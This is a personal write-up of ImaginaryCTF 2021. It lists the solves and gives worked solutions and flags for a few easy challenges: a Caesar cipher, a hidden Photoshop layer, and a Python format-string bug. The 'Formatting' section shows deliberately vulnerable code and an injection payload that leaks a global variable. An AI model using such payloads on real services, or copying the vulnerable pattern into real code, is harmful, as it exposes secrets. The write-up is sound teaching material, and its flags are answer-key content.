# ImaginaryCTF 2021

ImaginaryCTF 2021, from July 23 4PM - July 27 4PM (UTC).

## Solves

(arranged by points)

Challenge | Category | Points
--------- | -------- | ------
Sanity Check | Misc | 15
Discord	| Misc | 15
Chicken Caesar Salad | Crypto | 50
Hidden | Forensics | 50
Roos World | Web | 50
stackoverflow | Pwn | 50
Fake Canary | Pwn | 100
Flip Flops | Crypto | 100
Formatting | Misc | 100
Spelling Test | Misc | 100
Stings | Rev | 100
Vacation | Forensics | 100
Lines | Crypto | 150
Normal | Reversing | 150
The First Fit | Pwn | 150
Jumprope | Reversing | 200
No Thoughts, Head Empty | Reversing | 200
linonophobia | Pwn | 200
Speedrun | Pwn | 200
Abnormal | Reversing | 250
It's Not Pwn, I Swear! | Reversing | 250

## Writeups

### Sanity Check (Misc, 15pts)

**Description**

Welcome to ImaginaryCTF! All flags are written in flag format `ictf{.*}` unless otherwise stated. Have fun and enjoy the challenges!

**Attachments**

`ictf{w3lc0m3_t0_1m@g1nary_c7f_2021!}`

**Solution**

Submit the flag. Free 15 points.

**Flag**
```
ictf{w3lc0m3_t0_1m@g1nary_c7f_2021!}
```


### Discord (Misc, 15 pts)

**Description**

Join our Discord server! We can provide support for challenge issues there, AND we have practice challenges everyday when this CTF isn't running. Join at https://discord.gg/ctf .

**Attachments**

https://discord.gg/ctf

**Solution**

Join discord; flag is at the `#imaginaryctf-2021` channel. Another free 15 points.

**Flag**
```
ictf{d41ly_ch4lls_0n_d1sc0rd_AND_4_ctf?_epic}
```

### Chicken Caesar Salad (Crypto, 50 pts)

**Description**

I remember the good old days when Caesar ciphers were easy…

**Attachments**

`chicken-caesar-salad.txt`; contains `qkbn{ePmv_lQL_kIMamZ_kQxpMZa_oMb_aW_pIZl}`

**Solution**

Go to any caesar cipher decoder (dcode.fr, for instance) and try all 25 combinations; the one with `ictf` as the first four letters is the flag.

**Flag**

```
ictf{wHen_dID_cAEseR_cIphERs_gEt_sO_hARd}
```

### Hidden | Forensics | 50

**Description**

Oh no, someone hid my flag behind a giant red block! Please help me retrieve it!!

**Attachments**

`challenge.psd`

**Solution**

`.psd` is a photoshop document file. Go to any editor (photopea.com, for instance) and open challenge.psd, then drag the red block to reveal the flag.

Or do `strings challenge.psd | grep ictf` to get the flag.

**Flag**

```
ictf{wut_how_do_you_see_this}
```

### Roos World | Web | 50

### stackoverflow | Pwn | 50

### Fake Canary | Pwn | 100

### Flip Flops | Crypto | 100

### Formatting | Misc | 100

**Description**

Wait, I thought format strings were only in C???

**Attachments**

`stonks.py`

**Solution**

`stonks.py`:
``` python
#!/usr/bin/env python3

art = '''
                                         88
            ,d                           88
            88                           88
,adPPYba, MM88MMM ,adPPYba,  8b,dPPYba,  88   ,d8  ,adPPYba,
I8[    ""   88   a8"     "8a 88P'   `"8a 88 ,a8"   I8[    ""
 `"Y8ba,    88   8b       d8 88       88 8888[      `"Y8ba,
aa    ]8I   88,  "8a,   ,a8" 88       88 88`"Yba,  aa    ]8I
`"YbbdP"'   "Y888 `"YbbdP"'  88       88 88   `Y8a `"YbbdP"'
'''

flag = open("flag.txt").read()

class stonkgenerator: # I heard object oriented programming is popular
    def __init__(self):
        pass
    def __str__(self):
        return "stonks"

def main():
    print(art)
    print("Welcome to Stonks as a Service!")
    print("Enter any input, and we'll say it back to you with any '{a}' replaced with 'stonks'! Try it out!")
    while True:
        inp = input("> ")
        print(inp.format(a=stonkgenerator()))

if __name__ == "__main__":
    main()
```

As from the name of the challenge and the description, the python code has a format string to our input: `inp.format(a=stonkgenerator())`. Python functions have a `__globals__` attribute (see [documentation](https://docs.python.org/3/reference/datamodel.html#the-standard-type-hierarchy)), which is a dictionary holding the global variables of the function. Since `stonkgenerator` is a class with an `__init__` and `__str__` methods, we can use those to get access to the global variable `flag`.

```
$ nc chal.imaginaryctf.org 42014

                                         88
            ,d                           88
            88                           88
,adPPYba, MM88MMM ,adPPYba,  8b,dPPYba,  88   ,d8  ,adPPYba,
I8[    ""   88   a8"     "8a 88P'   `"8a 88 ,a8"   I8[    ""
 `"Y8ba,    88   8b       d8 88       88 8888[      `"Y8ba,
aa    ]8I   88,  "8a,   ,a8" 88       88 88`"Yba,  aa    ]8I
`"YbbdP"'   "Y888 `"YbbdP"'  88       88 88   `Y8a `"YbbdP"'

Welcome to Stonks as a Service!
Enter any input, and we'll say it back to you with any '{a}' replaced with 'stonks'! Try it out!
> {a.__init__.__globals__[flag]}
ictf{c4r3rul_w1th_f0rmat_str1ngs_4a2bd219}

```

**Flag**

```
ictf{c4r3rul_w1th_f0rmat_str1ngs_4a2bd219}
```

### Spelling Test | Misc | 100
### Stings | Rev | 100
### Vacation | Forensics | 100
### Lines | Crypto | 150
### Normal | Reversing | 150
### The First Fit | Pwn | 150
### Jumprope | Reversing | 200
### No Thoughts, Head Empty | Reversing | 200
### linonophobia | Pwn | 200
### Speedrun | Pwn | 200
### Abnormal | Reversing | 250
### It's Not Pwn, I Swear! | Reversing | 250